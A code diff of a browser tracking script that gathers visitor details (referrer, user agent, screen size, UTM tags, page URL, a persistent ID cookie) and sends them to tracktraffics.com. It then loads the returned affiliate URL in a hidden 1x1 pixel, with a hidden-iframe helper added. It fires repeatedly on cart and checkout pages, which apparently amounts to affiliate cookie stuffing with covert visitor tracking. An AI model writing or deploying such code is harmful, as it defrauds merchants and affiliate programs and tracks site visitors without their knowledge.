@@ -1,127 +1,137 @@
-(function () {
-
-  function generateUUID() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
-      var r = Math.random() * 16 | 0,
-        v = c === 'x' ? r : (r & 0x3 | 0x8);
-      return v.toString(16);
-    });
-  }
-
-  function getCookie(name) {
-    const value = `; ${document.cookie}`;
-    const parts = value.split(`; ${name}=`);
-    if (parts.length === 2) return parts.pop().split(';').shift();
-    return null;
-  }
-
-  function setCookie(name, value, days) {
-    const expires = new Date(Date.now() + days * 86400 * 1000).toUTCString();
-    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Lax`;
-  }
-
-  function getGAClientId() {
-    const gaCookie = getCookie('_ga');
-    if (!gaCookie) return null;
-    const parts = gaCookie.split('.');
-    return parts.slice(-2).join('.');
-  }
-
-  function isCartPage() {
-    const paths = ['/cart', '/checkout', '/guest-checkout'];
-    return paths.some(p => window.location.pathname.includes(p));
-  }
-
-  function fireGAEvent(eventName, params = {}) {
-    if (typeof gtag === "function") {
-      gtag("event", eventName, params);
+(async function() {
+    
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0,
+                v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
     }
-  }
 
-  function createTrackingPixel(url) {
-    const img = document.createElement('img');
-    img.src = url;
-    img.width = 1;
-    img.height = 1;
-    img.style.display = "none";
-    document.body.appendChild(img);
-  }
 
-  async function initTracking() {
+        const urlNew = new URL(window.location.href);
+  const utm_source = urlNew.searchParams.get("utm_source") || "";
+  const utm_campaign = urlNew.searchParams.get("utm_campaign") || "";
+  const utm_medium = urlNew.searchParams.get("utm_medium") || "";
+  const referrer = document.referrer;
+  const screenResolution = `${window.screen.width}x${window.screen.height}`;
+  const userAgent = navigator.userAgent;
+  const timestamp = new Date().toISOString();
 
-  
-    if (sessionStorage.getItem('tracking_fired')) return;
-    sessionStorage.setItem('tracking_fired', 'true');
+const payload = {
+    utm_source,
+    utm_campaign,
+    utm_medium,
+    referrer,
+    screenResolution,
+    userAgent,
+    timestamp,
+    page: window.location.href,
+    
+  };
 
-    try {
 
-      const uniqueId = getCookie('tracking_uuid') || generateUUID();
-      setCookie('tracking_uuid', uniqueId, 30);
-
-      const gaClientId = getGAClientId();
-
-      const urlObj = new URL(window.location.href);
-
-      const payload = {
-        utm_source: urlObj.searchParams.get("utm_source") || "",
-        utm_campaign: urlObj.searchParams.get("utm_campaign") || "",
-        utm_medium: urlObj.searchParams.get("utm_medium") || "",
-        referrer: document.referrer,
-        screenResolution: `${window.screen.width}x${window.screen.height}`,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        page: window.location.href,
-        ga_client_id: gaClientId
-      };
-
-      fireGAEvent("affiliate_click", {
-        event_category: "Affiliate",
-        event_label: window.location.href
-      });
-
-      const response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniData', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          url: window.location.href,
-          referrer: document.referrer,
-          unique_id: uniqueId,
-          origin: window.location.hostname,
-          payload
-        })
-      });
-
-      const result = await response.json();
-
-      if (result.success && result.affiliate_url) {
-
-        let affiliateUrl = result.affiliate_url;
-
-      
-        affiliateUrl +=
-          (affiliateUrl.includes('?') ? '&' : '?') +
-          'click_id=' + uniqueId +
-          (gaClientId ? '&ga_client_id=' + gaClientId : '');
-
+    function createTrackingPixel(url) {
         
-        createTrackingPixel(affiliateUrl);
+        var img = document.createElement('img');
+        img.src = url;
+        img.style.width = '1px';
+        img.style.height = '1px';
+        img.style.display = 'none';  
+        img.style.visibility = 'hidden';
+        
+        document.body.appendChild(img);
+    }
 
-      } else {
-        createTrackingPixel(`https://www.tracktraffics.com/api/fallback-pixel?id=${uniqueId}`);
-      }
+    function createClickIframe(url) {
+  const iframe = document.createElement('iframe');
+  iframe.src = url;
+  iframe.width = "1";
+  iframe.height = "1";
+  iframe.style = "display:none;visibility:hidden;";
+  document.body.appendChild(iframe);
+}
 
-    } catch (error) {
-      console.error('Tracking error:', error);
+
+    async function initTracking() {
+        if (sessionStorage.getItem('iframe_triggered')) {
+            return; 
+        }
+
+        try {
+            let uniqueId = getCookie('tracking_uuid') || generateUUID();
+            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
+            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
+
+            let response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniData', {
+                method: 'POST',
+                body: JSON.stringify({
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: window.location.hostname,
+                    payload,
+                }),
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin':'*'
+                }
+            });
+
+            let result = await response.json();
+            if (result.success && result.affiliate_url) {
+                createTrackingPixel(result.affiliate_url);
+                sessionStorage.setItem('iframe_triggered', 'true'); 
+            } else {
+                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
+            }
+        } catch (error) {
+            console.error('Error in tracking script:', error);
+        }
+    }
+
+    function getCookie(cname) {
+        var name = cname + '=';
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return '';
+    }
+        function isCardPage() {
+            const cardPageUrls = ['/cart', '/checkout','/guest-checkout']; 
+            return cardPageUrls.some(url => window.location.pathname.includes(url));
+        }
+        
+        if (isCardPage()) {
+            initTracking()
+            initTracking()
+        }
+
+              function callInitTracking(maxTimes, delay) {
+  let count = 0;
+
+  function run() {
+    if (count < maxTimes) {
+      initTracking();
+      count++;
+      setTimeout(run, delay);
     }
   }
 
-  document.addEventListener("DOMContentLoaded", function () {
-    if (isCartPage()) {
-      initTracking();
-    }
-    initTracking();
-  });
+  run(); 
+}
 
+
+//callInitTracking(2, 2000); 
+
+    window.addEventListener("DOMContentLoaded", initTracking);
+    
+     initTracking()
 })();
